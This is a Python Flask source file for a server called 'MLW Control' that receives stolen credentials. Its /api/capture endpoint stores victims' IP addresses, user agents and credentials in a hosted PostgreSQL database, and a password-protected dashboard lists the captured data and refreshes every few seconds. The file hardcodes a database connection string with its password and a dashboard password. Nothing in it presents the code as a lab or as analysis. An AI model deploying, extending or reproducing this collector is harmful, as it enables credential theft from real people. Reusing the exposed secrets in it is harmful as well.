from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import psycopg2
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://mlw_attack_user:ShJf3c9NA4Jf1ADITLYh3fIlHc7akHXC@dpg-d8063p9j2pic73f1mm40-a.frankfurt-postgres.render.com:5432/mlw_attack')

def get_db():
    return psycopg2.connect(DATABASE_URL, sslmode='require')

def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS captured (
            id SERIAL PRIMARY KEY,
            timestamp TIMESTAMP DEFAULT NOW(),
            ip TEXT,
            user_agent TEXT,
            credentials TEXT
        )
    ''')
    conn.commit()
    cur.close()
    conn.close()
    print("[+] Database ready")

init_db()

HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>MLW Control</title>
    <style>
        body{background:#0a0e27;color:#00ffcc;font-family:monospace;padding:20px;}
        h1{color:#ff3366;}
        table{width:100%;border-collapse:collapse;}
        th,td{border:1px solid #00ffcc;padding:8px;text-align:left;}
        th{background:#1a1f3a;}
        .login{max-width:300px;margin:100px auto;background:#1a1f3a;padding:20px;}
        input,button{width:100%;padding:10px;margin:5px 0;background:#0a0e27;color:#00ffcc;border:1px solid #00ffcc;}
    </style>
    <script>
        async function checkAuth() {
            const res = await fetch('/api/auth');
            const data = await res.json();
            if (!data.auth) {
                document.getElementById('login').style.display = 'block';
                document.getElementById('content').style.display = 'none';
            } else {
                document.getElementById('login').style.display = 'none';
                document.getElementById('content').style.display = 'block';
                loadData();
                setInterval(loadData, 5000);
            }
        }
        async function login() {
            const pwd = document.getElementById('pwd').value;
            const res = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pwd})});
            const data = await res.json();
            if (data.success) checkAuth();
        }
        async function loadData() {
            const res = await fetch('/api/data');
            const data = await res.json();
            document.getElementById('data').innerHTML = data.map(r => `<tr><td>${r.timestamp}</td><td>${r.ip}</td><td>${r.credentials}</td></tr>`).join('');
        }
        checkAuth();
    </script>
</head>
<body>
<div id="login" class="login" style="display:none">
    <h2>MLW Control</h2>
    <input type="password" id="pwd" placeholder="Password">
    <button onclick="login()">Login</button>
</div>
<div id="content">
    <h1>MLW Control - Captured Data</h1>
    <table><th>Time</th><th>IP</th><th>Credentials</th></tr><tbody id="data"></tbody></table>
</div>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/api/auth')
def auth():
    return jsonify({'auth': request.cookies.get('mlw_auth') == 'true'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    if data.get('password') == '0880Mdav!':
        resp = jsonify({'success': True})
        resp.set_cookie('mlw_auth', 'true', httponly=True, secure=True, samesite='Strict')
        return resp
    return jsonify({'success': False})

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    conn = get_db()
    cur = conn.cursor()
    cur.execute('INSERT INTO captured (ip, user_agent, credentials) VALUES (%s, %s, %s)', 
        (request.remote_addr, request.headers.get('User-Agent', ''), data.get('data', '')))
    conn.commit()
    cur.close()
    conn.close()
    print(f"[+] Captured: {data.get('data')}")
    return jsonify({'status': 'ok'})

@app.route('/api/data')
def get_data():
    conn = get_db()
    cur = conn.cursor()
    cur.execute('SELECT timestamp, ip, credentials FROM captured ORDER BY timestamp DESC LIMIT 100')
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return jsonify([{'timestamp': r[0], 'ip': r[1], 'credentials': r[2]} for r in rows])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
